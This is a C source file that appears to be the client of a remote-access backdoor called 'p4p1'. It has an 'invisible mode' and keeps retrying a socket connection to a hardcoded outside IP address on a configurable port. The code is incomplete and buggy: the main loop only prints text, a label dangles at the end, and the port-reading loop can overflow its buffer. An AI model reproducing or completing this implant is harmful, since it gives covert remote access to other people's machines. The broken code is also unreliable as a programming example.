#include "p4p1-h_linux.h"

int main(int argc, char *argv[])
{
  if(argc == 1){
    //invisible mode
    printf("invis mode on!");
  }

  int portno;
  char portchar[6];
  FILE *fp = fopen("port.cfg", "r");

  if(fp == NULL){
    portno = 4441;
  } else {
    int i = 0;
    char c;

    while((c = fgetc(fp)) != EOF){
      portchar[i] = c;
      i++;
    }
    portchar[i+1] = '\0';

    portno = atoi(portchar);

    fclose(fp);
  }


  while(1){

    int bytesSent, bytesRecv, cn;
    struct sockaddr_in server, client;
    char sessionID[5] = "";					// Session id given by serv
		char buf[BUFSIZE] = "";					//buf
    char prompt[10] = "\n<p4p1 /> ";			//prompt if no session id
		char ui[95] = "       _ _       _\n  _ __| | | _ __/ |\n | '_ \\_  _| '_ \\ |\n | .__/ |_|| .__/_|\n |_|       |_|\n\0";

    client.sin_family = AF_INET;
    client.sin_port = htons(portno);
    client.sin_addr.s_addr = inet_addr(xstr(86.247.205.102));	//this should not be hard coded.

    int * pbs = &bytesSent;
    int *pbr = &bytesRecv;

    //Start up socket and try connecting.
    int s = socket(AF_INET, SOCK_STREAM, 0);
    if(s == -1){
      break;
    }

    do{
      cn = connect(s, &client, sizeof(client));
    } while(cn == SOCKET_ERROR);

    if(cn != SOCKET_ERROR){
      printf("session id\n");
    }

    while(cn != SOCKET_ERROR){
      printf("main loop\n");
    }

    close: //ending label
  }

  return 0;
}
